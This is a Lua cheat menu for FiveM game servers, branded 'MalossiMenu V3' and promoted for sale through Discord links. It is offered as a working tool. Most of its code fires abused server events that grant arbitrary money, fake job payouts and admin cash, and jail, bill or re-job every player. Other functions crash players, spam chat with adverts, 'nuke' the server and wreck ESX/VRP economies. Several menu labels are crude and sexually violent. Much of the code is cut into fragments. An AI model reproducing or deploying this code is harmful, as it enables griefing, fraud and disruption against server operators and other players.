...
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "Cargoforiv" }
...
local function debugPrint(text)
    if foriv.debug then
        Citizen.Trace("[foriv] "..tostring(text))
    end
end
...
function foriv.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
...
function foriv.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        foriv.CreateMenu(id, menus[parent].title)
...
function foriv.CurrentMenu()
    return currentMenu
end


function foriv.OpenMenu(id)
    if id and menus[id] then
...
function foriv.IsMenuOpened(id)
    return isMenuVisible(id)
end


function foriv.IsAnyMenuOpened()
...
function foriv.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function foriv.Button(text, subText)
...
function foriv.MenuButton(text, id)
    if menus[id] then
        if foriv.Button(text) then
            setMenuVisible(currentMenu, false)
...
function foriv.CheckBox(text, checked, callback)
    if foriv.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function foriv.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if foriv.Button(text, selectedItem) then
...
function foriv.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function foriv.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function foriv.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function foriv.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function foriv.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function foriv.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function foriv.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function foriv.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function foriv.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function foriv.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function foriv.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function foriv.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function foriv.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function foriv.SetMenuButtonPressedSound(id, name, set)
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'MalossiHosting#2143 MalossiMenu V3',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discord.io/MalossiLuaMenus'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'MalossiHosting#2143 MalossiMenu V3 https://discord.io/MalossiLuaMenus',
                                43161337
                            )
...
function teleportToNearestVehicle()
            ...
            local Nearestforiv = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestforivPos = GetEntityCoords(Nearestforiv, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (Nearestforiv == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (Nearestforiv ~= 0) then
            if IsVehicleSeatFree(Nearestforiv, -1) then
                SetPedIntoVehicle(playerPed, Nearestforiv, -1)
                SetVehicleAlarm(Nearestforiv, false)
                SetVehicleDoorsLocked(Nearestforiv, 1)
                SetVehicleNeedsToBeHotwired(Nearestforiv, false)
            else
                local driverPed = GetPedInVehicleSeat(Nearestforiv, -1)
        ...
        elseif (NearestVehicle ~= 0) and (Nearestforiv == 0) then
            ...
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (Nearestforiv ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestforivPos.x, NearestforivPos.y, NearestforivPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
            ...
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestforivPos.x, NearestforivPos.y, NearestforivPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(Nearestforiv, -1) then
                    SetPedIntoVehicle(playerPed, Nearestforiv, -1)
                    SetVehicleAlarm(Nearestforiv, false)
                    SetVehicleDoorsLocked(Nearestforiv, 1)
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordAppId(630312562688393226)

            --Here you will have to put the image name for the "large" icon.
            SetDiscordRichPresenceAsset("MalossiMenu")

            --(11-11-2018) New Natives:

            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText("MalossiMenu V3 | MalossiHosting#2143")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("MalossiMenu")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("Contact MalossiHosting#2143 to buy!")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"MalossiMenu V3; MalossiHosting#2143")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'MalossiHosting#2143',
                    {0, 0x99, 255},
                    '/ooc MalossiMenu V3! Buy at https://discord.io/MalossiLuaMenus'
                )
                TriggerServerEvent('_chat:messageEntered', 'MalossiHosting#2143', {0, 0x99, 255}, 'MalossiMenu V3 <3 https://discord.io/MalossiLuaMenus')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "MalossiMenu V3 Babe <3 MalossiHosting#2143 https://discord.io/MalossiLuaMenus")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "MalossiMenu V3 Babe <3 MalossiHosting#2143 https://discord.io/MalossiLuaMenus")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "The best menu in fivem!?,https://discord.gg/GbsQxN MalossiHosting#2143 ", 10000000)
				end
			end
...
Citizen.CreateThread(
    function()
        ...
        foriv.CreateMenu("MainMenu", "MalossiMenu")
        foriv.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
        foriv.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        foriv.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        foriv.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        foriv.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
        foriv.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        foriv.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        foriv.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        foriv.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        foriv.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        foriv.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        foriv.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		foriv.CreateSubMenu("AI", "MainMenu", "AI Menu")
		foriv.CreateSubMenu("Credits", "MainMenu", "Credits")
        foriv.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        foriv.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        foriv.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        foriv.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        foriv.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        foriv.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        foriv.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        foriv.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        foriv.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        foriv.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        foriv.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        foriv.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        foriv.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        foriv.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        foriv.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        foriv.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        foriv.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		foriv.CreateSubMenu("Models", "MainMenu", "Models")
        ...
        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "VRPMenu", "Models"}


        while Enabled do
            if foriv.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~MalossiMenu ~s~GENG")
                if foriv.MenuButton    ("~r~→ Self ~s~Menu", "SelfMenu") then
                elseif foriv.MenuButton("~r~→ Teleport ~s~Menu", "TeleportMenu") then
				elseif foriv.MenuButton("~r~→ Al ~s~Menu", "AI") then
                elseif foriv.MenuButton("~r~→ Online ~s~Players", "OnlinePlayersMenu") then
                elseif foriv.MenuButton("~r~→ Weapon ~s~Menu", "WeaponMenu") then
                elseif foriv.MenuButton("~r~→ Vehicle ~s~Menu", "VehMenu") then
                elseif foriv.MenuButton("~r~→ Malicious ~s~Hacks", "MaliciousMenu") then
                elseif foriv.MenuButton("~r~→ Trolling ~s~Options", "TrollMenu") then
                elseif foriv.MenuButton("~r~→ ESX ~s~Options", "ESXMenu") then
                elseif foriv.MenuButton("~r~→ VRP ~s~Options", "VRPMenu") then
				elseif foriv.MenuButton("~r~→ Models ~s~Menu", "Models") then
				elseif foriv.MenuButton("~r~→ Credits ~s~Menu", "Credits") then
                elseif foriv.Button("~r~→ Close the menu") then
                    Enabled = false
                end

                foriv.Display()
            elseif foriv.IsMenuOpened("VRPMenu") then
                if foriv.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif foriv.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif foriv.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif foriv.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif foriv.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif foriv.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif foriv.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif foriv.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                foriv.Display()
            elseif foriv.IsMenuOpened("TrollMenu") then
                if foriv.Button("ESX Server Crasher") then
                ...
                then
				elseif foriv.Button("Spawn moutain Lion On Everyone") then
				...
				elseif foriv.Button("SWAT W/ Railgun On Everyone") then
                ...
                elseif foriv.Button("Nuke Server") then
                    nukeserver()
				elseif foriv.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif foriv.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
				...
				elseif foriv.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 https://discord.gg/Ggs6nfe", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 https://discord.gg/Ggs6nfe", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 https://discord.gg/Ggs6nfe", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 https://discord.gg/Ggs6nfe", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "MalossiMenu V3 https://discord.gg/Ggs6nfe", "6969696969")
                end
				elseif foriv.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif foriv.Button("Rape All Players") then
                    RapeAllFunc()
                elseif foriv.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif foriv.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif foriv.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif foriv.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif foriv.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif foriv.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif foriv.Button("Fake Message") then
                ...
                elseif foriv.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif foriv.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("TeleportMenu") then
                if foriv.Button("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif foriv.Button("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif foriv.Button("Teleport To Coords") then
                    TeleportToCoords()
                elseif foriv.CheckBox(
                    "Show Coords",
                    showCoords,
				...
				foriv.Display()
			elseif foriv.IsMenuOpened("Models") then	
			if foriv.Button("~b~~h~Change to Clown") then
			...
			elseif foriv.Button("~b~~h~Change to Swat") then
			...
			elseif foriv.Button("~b~~h~Change to Stripper") then
			local model = "s_f_y_stripper_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Cop") then
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Chimp") then
			local model = "a_c_chimp"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Alien") then
			local model = "s_m_m_movalien_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Babyd") then
			local model = "u_m_y_babyd"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Big Fooot") then
			local model = "ig_orleans"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Franklin") then
			local model = "player_one"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Trevor") then
			local model = "player_two"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Michael") then
			local model = "player_zero"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif foriv.Button("~b~~h~Change to Fivem skin") then
			...
			elseif foriv.Button("~r~~h~Randomize Clothing") then
                ...
                foriv.Display()
			elseif foriv.IsMenuOpened("AI") then
			                if foriv.Button("~h~Configure AI ~g~Speed") then
                ...
                elseif foriv.Button("~h~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif foriv.Button("~h~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif foriv.Button("~h~Stop AI") then
                    ...
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ...
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				                ...
				                foriv.Display()
            elseif foriv.IsMenuOpened("VehMenu") then
                if foriv.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif foriv.Button("Repair Engine Only") then
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif foriv.Button("~g~Buy vehicle for free") then fv()
					elseif
					foriv.CheckBox(
				...
				then
                elseif foriv.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "MalossiMenu V3")
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif foriv.MenuButton("LS Customs", "LSC") then
				                elseif
                    foriv.CheckBox(
                 ...
                 then
                elseif foriv.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					foriv.CheckBox(
						"No Fall",
				 ...
				 then
				elseif foriv.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
			...
			then
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("ESXMenu") then
                if foriv.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                elseif foriv.MenuButton("ESX Job Menu", "ESXJobMenu") then
                elseif foriv.MenuButton("ESX Boss", "ESXBossMenu") then
                elseif foriv.MenuButton("ESX Drugs", "ESXDrugMenu") then
                elseif foriv.MenuButton("ESX Misc", "ESXMiscMenu") then
                end

                foriv.Display()
            elseif foriv.IsMenuOpened("ESXMiscMenu") then
                if foriv.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif foriv.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif foriv.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                foriv.Display()
            elseif foriv.IsMenuOpened("ESXDrugMenu") then
                if foriv.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif foriv.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif foriv.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif foriv.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif foriv.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif foriv.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif foriv.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif foriv.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif foriv.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif foriv.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif foriv.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif foriv.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif foriv.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif foriv.Button("Stop all (Drugs)") then
			...
			elseif foriv.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif foriv.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif foriv.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif foriv.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif foriv.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif foriv.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif foriv.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif foriv.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif foriv.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif foriv.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif foriv.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif foriv.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif foriv.Button("~g~Pilot & Taxi (ESX) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif foriv.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif foriv.Button("~g~Paycheck $") then
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("SelfMenu") then
                if foriv.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif foriv.Button("Give Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif foriv.Button("~g~ESX ~s~Set hunger 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif foriv.Button("~g~ESX ~s~Set thirst 100%") then
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif foriv.Button("Give yourself money (ESX)") then
				...
				elseif foriv.Button("Taxijob ESX 10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif foriv.Button("Give yourself money (VRP)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif foriv.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif foriv.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif foriv.Button("~h~~b~Open Jail Menu ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif foriv.Button("ESX Get Out Of Jail") then
                ...
                elseif foriv.Button("Suicide") then
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and foriv.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    foriv.Display()
				elseif foriv.IsMenuOpened("Credits") then
				    if foriv.Button(" ~r~~h~foriv#0001 - Owner") then
				elseif foriv.Button(" ~y~~h~MalossiHosting#2143 - Developer") then
				elseif foriv.Button(" ~g~~h~Not Soviet Bear#6205 - Helping tons") then
				elseif foriv.Button(" ~b~~h~Notorius#5267 - Helping/testing tons") then
				elseif foriv.Button(" ~p~~h~Fallen#0811 - Developer") then
				elseif foriv.Button(" ~h~Maestro Menu - Inspiration") then
				end
				foriv.Display()
                elseif foriv.IsMenuOpened("PlayerOptionsMenu") then
                    foriv.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if foriv.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif foriv.Button("Rape Player") then
					    rapeplayer()
					elseif foriv.Button("Open inventory") then
